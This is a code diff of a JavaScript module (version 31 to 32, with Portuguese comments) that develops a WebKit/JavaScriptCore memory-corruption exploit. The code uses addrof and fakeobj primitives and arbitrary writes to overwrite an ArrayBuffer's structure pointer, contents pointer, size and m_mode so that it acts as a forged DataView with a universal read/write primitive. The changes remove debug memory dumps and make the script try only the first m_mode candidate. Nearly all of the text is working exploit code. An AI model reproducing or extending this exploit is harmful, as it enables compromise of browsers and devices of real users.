@@ -1,7 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v31 - Otimização de Log e Revisão de Offsets para FASE 3)
+// js/script3/testArrayBufferVictimCrash.mjs (v32 - Testando Apenas um m_mode por Vez e Otimização de Dumps)
 // =======================================================================================
-// ESTA VERSÃO REDUZ A VERBOSIDADE E AJUSTA OS OFFSETS DE DATAVIEW PARA FASE 3.
-// FOCO: Otimizar o desempenho e depurar o comportamento do byteLength do DataView forjado.
+// ESTA VERSÃO TESTA UM M_MODE CANDIDATO POR VEZ PARA EVITAR LOOPS LENTOS E REDUZ DUMPS.
+// FOCO: Acelerar a depuração da FASE 3 e identificar o m_mode correto para o DataView forjado.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -22,7 +22,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v31 - Otimização de Log e Revisão de Offsets para FASE 3"; // Versão atualizada
+export const FNAME_MODULE = "v32 - Testando Apenas um m_mode por Vez e Otimização de Dumps"; // Versão atualizada
 
 // Ajustando pausas: mantendo algumas mas reduzindo as muito curtas e excessivas
 const LOCAL_VERY_SHORT_PAUSE = 5; // Reduzido
@@ -101,31 +101,27 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
 
         // DUMP 1: Conteúdo do backing_array_buffer_for_fake_dv antes da corrupção inicial.
-        logFn(`[${FNAME}] DEBUG: Dump do backing_array_buffer_for_fake_dv (0x${toHex(backing_ab_addr.low())}) ANTES da corrupção inicial (primeiros 0x60 bytes):`, "debug");
-        await dumpMemory(backing_ab_addr, 0x60, logFn, arb_read, `${FNAME}_BackingAB_Before`); // Usar arb_read (old primitive)
-        await pauseFn(LOCAL_SHORT_PAUSE);
+        // REMOVIDO PARA REDUZIR VERBOSIDADE
+        // logFn(`[${FNAME}] DEBUG: Dump do backing_array_buffer_for_fake_dv (0x${toHex(backing_ab_addr.low())}) ANTES da corrupção inicial (primeiros 0x60 bytes):`, "debug");
+        // await dumpMemory(backing_ab_addr, 0x60, logFn, arb_read, `${FNAME}_BackingAB_Before`);
+        // await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Corromper os metadados do ArrayBuffer de apoio para fazê-lo se parecer com um DataView.
         logFn(`[${FNAME}] Escrevendo Structure Pointer com Zero (OFFSET: ${toHex(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET)})...`, "info", FNAME);
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), AdvancedInt64.Zero, 8);
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
 
-        // ATENÇÃO AQUI: Estes offsets (CONTENTS_IMPL_POINTER_OFFSET, SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)
-        // são do ArrayBuffer, não do ArrayBufferView diretamente.
-        // A corrupção do DataView pode exigir que o ArrayBuffer SUBJACENTE seja manipulado.
-        // Se a `fakeobj_core` cria um DataView a partir de um ArrayBuffer corrompido,
-        // então os offsets do ArrayBuffer são os que importam para o DataView.
-        logFn(`[${FNAME}] Escrevendo ArrayBuffer.CONTENTS_IMPL_POINTER com Zero (OFFSET: ${toHex(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET)})...`, "info", FNAME);
+        logFn(`[${FNAME}] Escrevendo CONTENTS_IMPL_POINTER com Zero (OFFSET: ${toHex(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET)})...`, "info", FNAME);
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8);
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
 
-        logFn(`[${FNAME}] Escrevendo ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START com 0xFFFFFFFF (OFFSET: ${toHex(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)})...`, "info", FNAME);
+        logFn(`[${FNAME}] Escrevendo SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START com 0xFFFFFFFF (OFFSET: ${toHex(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)})...`, "info", FNAME);
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4);
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
         
         // Este é o offset M_MODE_OFFSET do ArrayBufferView, que pode ser diferente para um DataView forjado.
         // Se o DataView tem suas próprias flags, então este é o local.
-        logFn(`[${FNAME}] Escrevendo ArrayBufferView.M_MODE_OFFSET com ${toHex(m_mode_to_try)} (OFFSET: ${toHex(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET)})...`, "info", FNAME);
+        logFn(`[${FNAME}] Escrevendo M_MODE_OFFSET com ${toHex(m_mode_to_try)} (OFFSET: ${toHex(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET)})...`, "info", FNAME);
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
 
@@ -133,9 +129,10 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // DUMP 2: Conteúdo do backing_array_buffer_for_fake_dv APÓS a corrupção inicial.
-        logFn(`[${FNAME}] DEBUG: Dump do backing_array_buffer_for_fake_dv (0x${toHex(backing_ab_addr.low())}) APÓS todas as corrupções iniciais:`, "debug");
-        await dumpMemory(backing_ab_addr, 0x60, logFn, arb_read, `${FNAME}_BackingAB_AfterCorruption`); // Usar arb_read
-        await pauseFn(LOCAL_SHORT_PAUSE);
+        // REMOVIDO PARA REDUZIR VERBOSIDADE
+        // logFn(`[${FNAME}] DEBUG: Dump do backing_array_buffer_for_fake_dv (0x${toHex(backing_ab_addr.low())}) APÓS todas as corrupções iniciais:`, "debug");
+        // await dumpMemory(backing_ab_addr, 0x60, logFn, arb_read, `${FNAME}_BackingAB_AfterCorruption`);
+        // await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Forjar o DataView a partir do endereço do ArrayBuffer corrompido.
         logFn(`[${FNAME}] Chamando fakeobj_core para forjar o DataView a partir de ${backing_ab_addr.toString(true)}...`, "info", FNAME);
@@ -150,10 +147,11 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // DUMP 3: Conteúdo do _fake_data_view (em seu próprio endereço)
-        const fake_dv_addr = addrof_core(_fake_data_view);
-        logFn(`[${FNAME}] DEBUG: Dump do _fake_data_view (0x${toHex(fake_dv_addr.low())}) APÓS criação do esqueleto (primeiros 0x60 bytes):`, "debug");
-        await dumpMemory(fake_dv_addr, 0x60, logFn, arb_read, `${FNAME}_FakeDV_AfterSkeleton`); // Usar arb_read
-        await pauseFn(LOCAL_SHORT_PAUSE);
+        // REMOVIDO PARA REDUZIR VERBOSIDADE
+        // const fake_dv_addr = addrof_core(_fake_data_view);
+        // logFn(`[${FNAME}] DEBUG: Dump do _fake_data_view (0x${toHex(fake_dv_addr.low())}) APÓS criação do esqueleto (primeiros 0x60 bytes):`, "debug");
+        // await dumpMemory(fake_dv_addr, 0x60, logFn, arb_read, `${FNAME}_FakeDV_AfterSkeleton`);
+        // await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Teste Básico: tentar ler o byteLength do fake_data_view.
         logFn(`[${FNAME}] Verificando byteLength do fake DataView...`, "info", FNAME);
@@ -166,14 +164,6 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
                  return true;
             } else {
                  logFn(`[${FNAME}] ALERTA: Teste básico de byteLength do fake DV falhou. Esperado 0xFFFFFFFF, lido ${current_byte_length}.`, "warn", FNAME);
-                 // Adicionar dump de um DataView real para comparação, se necessário:
-                 /*
-                 logFn(`[${FNAME}] DEBUG: Dump de um DataView REAL para comparação:`, "debug");
-                 const real_dv_for_dump = new DataView(new ArrayBuffer(0x1000));
-                 hold_objects.push(real_dv_for_dump);
-                 const real_dv_addr = addrof_core(real_dv_for_dump);
-                 await dumpMemory(real_dv_addr, 0x60, logFn, arb_read, `${FNAME}_RealDV_Compare`);
-                 */
                  return false;
             }
         } catch (e) {
@@ -396,26 +386,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
         let skeletonSetupSuccess = false;
         
-        for (const candidate_m_mode of mModeCandidates) {
-            logFn(`[${FNAME_CURRENT_TEST}] Tentando m_mode candidato: ${toHex(candidate_m_mode)} para esqueleto ARB R/W Universal`, "info");
-            skeletonSetupSuccess = await setupUniversalArbitraryReadWriteSkeleton(
-                logFn,
-                pauseFn,
-                JSC_OFFSETS_PARAM,
-                candidate_m_mode
-            );
-            if (skeletonSetupSuccess) {
-                found_m_mode = candidate_m_mode; // Salva o m_mode que funcionou para o esqueleto
-                logFn(`[${FNAME_CURRENT_TEST}] SUCESSO: Esqueleto Universal ARB R/W configurado com m_mode: ${toHex(found_m_mode)}.`, "good");
-                break;
-            } else {
-                logFn(`[${FNAME_CURRENT_TEST}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou para esqueleto. Tentando o próximo...`, "warn");
-                await pauseFn(LOCAL_SHORT_PAUSE);
-            }
+        // Testar APENAS o primeiro candidato do m_mode
+        const candidate_m_mode = mModeCandidates[0]; 
+        logFn(`[${FNAME_CURRENT_TEST}] Tentando APENAS o primeiro m_mode candidato: ${toHex(candidate_m_mode)} para esqueleto ARB R/W Universal`, "info");
+        skeletonSetupSuccess = await setupUniversalArbitraryReadWriteSkeleton(
+            logFn,
+            pauseFn,
+            JSC_OFFSETS_PARAM,
+            candidate_m_mode
+        );
+        if (skeletonSetupSuccess) {
+            found_m_mode = candidate_m_mode; // Salva o m_mode que funcionou para o esqueleto
+            logFn(`[${FNAME_CURRENT_TEST}] SUCESSO: Esqueleto Universal ARB R/W configurado com m_mode: ${toHex(found_m_mode)}.`, "good");
+        } else {
+            logFn(`[${FNAME_CURRENT_TEST}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou para esqueleto. Abortando.`, "warn");
         }
 
         if (!skeletonSetupSuccess) {
-            const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar o esqueleto da primitiva Universal ARB R/W. Abortando exploração.";
+            const errorMsg = `Falha crítica: O PRIMEIRO m_mode candidato (${toHex(mModeCandidates[0])}) não conseguiu configurar o esqueleto da primitiva Universal ARB R/W. Abortando exploração.`;
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
